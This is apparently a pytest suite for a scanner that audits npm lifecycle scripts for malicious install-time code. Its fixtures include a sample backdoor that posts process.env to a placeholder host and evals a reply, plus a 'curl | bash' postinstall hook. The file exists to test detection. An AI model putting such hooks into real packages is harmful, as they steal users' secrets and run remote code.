"""Pre-install audit for a JavaScript project.

The scenario: a project whose install-time code reads the environment, sends it
out, and evaluates the reply. These tests pin that detection, the decoys that
must not trigger it, and the coverage rules that must never look clean.
"""

import io
import json
import subprocess

import pytest

from aurascan.analyzers import npm_install_audit as analyzer
from aurascan.analyzers.npm_install_audit import (
    MAX_MANIFEST_CHARS,
    RULE_ENV_EXFIL_EVAL,
    RULE_INCOMPLETE,
    RULE_REMOTE_SCRIPT,
    audit_npm_install,
    install_code_signals,
)
from aurascan.core.npm_audit_cli import AUDIT_SCHEMA, run_npm_audit
from aurascan.core.models import Severity

BACKDOOR = (
    "const { execSync } = require('child_process');\n"
    "const data = JSON.stringify(process.env);\n"
    "fetch('https://example.invalid/collect', { method: 'POST', body: data });\n"
    "setInterval(() => { const reply = execSync('true').toString(); eval(reply); }, 5000);\n"
)


def _manifest(scripts):
    return json.dumps({"name": "demo", "version": "1.0.0", "scripts": scripts})


def _audit(tmp_path, scripts, files):
    manifest_path = str(tmp_path / "package.json")
    lifecycle = {str(tmp_path / name): text for name, text in files.items()}
    return audit_npm_install(manifest_path, _manifest(scripts), lifecycle)


def test_detects_the_environment_exfiltration_and_eval_chain(tmp_path):
    findings = _audit(tmp_path, {"postinstall": "node setup.js"}, {"setup.js": BACKDOOR})

    assert [finding.rule_id for finding in findings] == [RULE_ENV_EXFIL_EVAL]
    finding = findings[0]
    assert finding.severity is Severity.CRITICAL
    assert finding.blocks_installation is True
    assert finding.line_number == 2
    assert "environment access" in finding.evidence_snippet
    assert "dynamic code evaluation" in finding.evidence_snippet


def test_comments_strings_and_regexes_are_not_evidence():
    decoy = (
        "// process.env and fetch() and eval() in a comment\n"
        "const text = 'process.env fetch eval(x)';\n"
        "const pattern = /eval\\(/;\n"
        "console.log(text, pattern);\n"
    )

    assert install_code_signals(decoy) == {}


def test_partial_chain_alone_does_not_claim_a_backdoor(tmp_path):
    partial = "const token = process.env.NPM_TOKEN;\nconsole.log(Boolean(token));\n"

    assert _audit(tmp_path, {"preinstall": "node check.js"}, {"check.js": partial}) == []


def test_network_without_environment_access_is_not_the_backdoor_chain(tmp_path):
    download = "fetch('https://example.invalid/ping').then((r) => r.text());\n"

    assert _audit(tmp_path, {"prepare": "node fetch.js"}, {"fetch.js": download}) == []


def test_remote_pipe_lifecycle_command_blocks(tmp_path):
    findings = _audit(
        tmp_path,
        {"postinstall": "curl -fsSL https://example.invalid/install.sh | bash"},
        {},
    )

    assert [finding.rule_id for finding in findings] == [RULE_REMOTE_SCRIPT]
    assert findings[0].severity is Severity.HIGH
    assert findings[0].blocks_installation is True


def test_benign_project_is_clean_but_never_claims_safety(tmp_path):
    findings = _audit(
        tmp_path,
        {"postinstall": "node scripts/build.js"},
        {"scripts/build.js": "require('fs').writeFileSync('out.txt', 'ok');\n"},
    )

    assert findings == []


def test_entry_outside_the_project_is_reported_as_incomplete(tmp_path):
    findings = _audit(tmp_path, {"postinstall": "node ../evil.js"}, {})

    assert [finding.rule_id for finding in findings] == [RULE_INCOMPLETE]
    assert findings[0].blocks_installation is False
    assert findings[0].requires_manual_review is True


def test_missing_entry_file_is_incomplete_not_clean(tmp_path):
    findings = _audit(tmp_path, {"install": "node missing.js"}, {})

    assert [finding.rule_id for finding in findings] == [RULE_INCOMPLETE]


def test_malformed_manifest_is_incomplete(tmp_path):
    findings = audit_npm_install(str(tmp_path / "package.json"), "{not json", {})

    assert [finding.rule_id for finding in findings] == [RULE_INCOMPLETE]


def test_oversized_manifest_is_incomplete(tmp_path):
    findings = audit_npm_install(
        str(tmp_path / "package.json"), "{" + " " * (MAX_MANIFEST_CHARS + 8), {}
    )

    assert [finding.rule_id for finding in findings] == [RULE_INCOMPLETE]


def test_non_lifecycle_scripts_are_not_install_time(tmp_path):
    findings = _audit(
        tmp_path,
        {"test": "node setup.js", "start": "node setup.js"},
        {"setup.js": BACKDOOR},
    )

    assert findings == []


def test_audit_module_never_starts_a_process():
    source = (
        __import__("pathlib").Path(analyzer.__file__).read_text(encoding="utf-8")
    )

    assert "subprocess" not in source
    assert "os.system" not in source


def test_cli_reports_blocking_findings_and_exit_code(tmp_path):
    (tmp_path / "package.json").write_text(
        _manifest({"postinstall": "node setup.js"}), encoding="utf-8"
    )
    (tmp_path / "setup.js").write_text(BACKDOOR, encoding="utf-8")
    stdout = io.StringIO()

    code = run_npm_audit([str(tmp_path), "--json"], stdout=stdout, stderr=io.StringIO())

    assert code == 1
    payload = json.loads(stdout.getvalue())
    assert payload["schema"] == AUDIT_SCHEMA
    assert payload["ok"] is False
    assert payload["counts"]["blocking"] == 1
    assert payload["findings"][0]["rule_id"] == RULE_ENV_EXFIL_EVAL
    assert "unknown" in payload["coverage"]["dependency_lifecycle_scripts"]


def test_cli_exit_codes_for_clean_and_missing_projects(tmp_path):
    clean = tmp_path / "clean"
    clean.mkdir()
    (clean / "package.json").write_text(_manifest({}), encoding="utf-8")
    assert run_npm_audit([str(clean)], stdout=io.StringIO(), stderr=io.StringIO()) == 0
    assert run_npm_audit([str(tmp_path / "absent")], stdout=io.StringIO(), stderr=io.StringIO()) == 2

def test_cli_does_not_follow_a_symlinked_entry(tmp_path):
    (tmp_path / "package.json").write_text(
        _manifest({"postinstall": "node setup.js"}), encoding="utf-8"
    )
    secret = tmp_path / "outside.js"
    secret.write_text(BACKDOOR, encoding="utf-8")
    (tmp_path / "setup.js").symlink_to(secret)
    stdout = io.StringIO()

    code = run_npm_audit([str(tmp_path), "--json"], stdout=stdout, stderr=io.StringIO())

    payload = json.loads(stdout.getvalue())
    # The link is refused, so nothing was read and the gap is reported instead of
    # being treated as a clean project.
    assert payload["inspected_install_files"] == []
    assert [finding["rule_id"] for finding in payload["findings"]] == [RULE_INCOMPLETE]
    assert payload["counts"]["blocking"] == 0
    assert code == 1
